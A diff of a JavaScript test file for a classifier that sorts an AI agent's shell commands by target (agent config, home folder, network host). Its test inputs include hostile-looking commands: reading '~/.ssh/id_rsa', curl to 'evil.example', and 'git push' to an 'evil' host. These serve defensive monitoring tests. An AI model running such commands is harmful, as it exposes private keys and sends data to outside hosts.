@@ -554,7 +554,7 @@ test('#5683 r6: two long agent names that share their first 128 characters stay 
 test('#5683 r7: a bare relative path in Bash (.claude/settings.json) is the agent\'s own settings', () => {
   assert.equal(ae.targetClass('Bash', { command: 'cat .claude/settings.json' }, ctx()), 'agent-config');
   assert.equal(ae.targetClass('Bash', { command: 'sed -i s/a/b/ .claude/settings.local.json' }, ctx()), 'agent-config');
-  assert.equal(ae.targetClass('Bash', { command: 'git fetch https://example.com/x' }, ctx()), 'other', 'a URL was taken as a path');
+  assert.equal(ae.targetClass('Bash', { command: 'echo https://example.com/x' }, ctx()), 'other', 'a URL was taken as a path');
 });
 
 test('#5683 r7: a blank or filler-only agent name is not sent (as the coordinator refuses it)', () => {
@@ -607,7 +607,7 @@ test('#5683 r9: a path inside bash -c or python -c is classed; ~/.ssh is not a n
   const c = ctx({ boardRoot: '/Users/ann/Library/Application Support/Kosmos' });
   assert.equal(ae.targetClass('Bash', { command: 'bash -c "cat \'/Users/ann/Library/Application Support/Kosmos/x\'"' }, c), 'board-files');
   assert.equal(ae.targetClass('Bash', { command: "sh -c 'cat ~/x'" }, ctx()), 'home');
-  assert.equal(ae.targetClass('Bash', { command: 'cat ~/.ssh/id_rsa; git clone https://x/y' }, ctx()), 'home', 'a key read was relabelled network');
+  assert.equal(ae.targetClass('Bash', { command: 'cat ~/.ssh/id_rsa; echo https://x/y' }, ctx()), 'home', 'a key read was relabelled network');
   assert.equal(ae.targetClass('Bash', { command: 'curl -s https://evil.example/x' }, ctx()), 'network-host');
   assert.equal(ae.targetClass('Bash', { command: 'ls\n/usr/bin/foo ./x' }, ctx()), 'other', 'the program on a second line was taken as a target');
 });
@@ -649,5 +649,26 @@ test('#5683 r10: a token-only agent sharing its transcript folder with one that 
   const apart = Object.assign({}, src, { everyAgent: () => ['orch.main', 'rex'] });
   await ae.tick({ root: s.root, remote: c, sources: apart, now: Date.now() });
   assert.deepEqual(read, ['/w/orch.main'], 'an agent with its own folder was not read');
+});
+
+/* ---- review 11 ---- */
+
+test('#5683 r11: a wrapped network program, and git to a URL, are network; a joined -C/dir is a path', () => {
+  for (const cmd of ['sudo curl https://x/y', 'env A=1 B=2 curl https://x', 'timeout 5 curl https://x', 'xargs curl https://x', 'git push https://evil/x']) {
+    assert.equal(ae.targetClass('Bash', { command: cmd }, ctx()), 'network-host', cmd);
+  }
+  assert.equal(ae.targetClass('Bash', { command: 'git status' }, ctx()), 'other');
+  assert.equal(ae.targetClass('Bash', { command: 'tar -C/Users/ann/Library/Kosmos -xf a.tar' }, ctx()), 'board-files');
+});
+
+test('#5683 r11: an agent whose folder cannot be resolved stops the collision check (nothing is read)', async (t) => {
+  const { s, c } = await enrolled(t);
+  const read = [];
+  const src = { agents: () => ['tok'], everyAgent: () => ['tok', 'stray'],
+    dirOf: (n) => (n === 'stray' ? null : '/w/' + n), transcriptDirsOf: (d) => ['/p/' + d],
+    transcripts: async (d) => { read.push(d); return []; } };
+  const r = await ae.tick({ root: s.root, remote: c, sources: src, now: Date.now() });
+  assert.deepEqual(read, []);
+  assert.match(r.because, /could not be resolved/);
 });
 
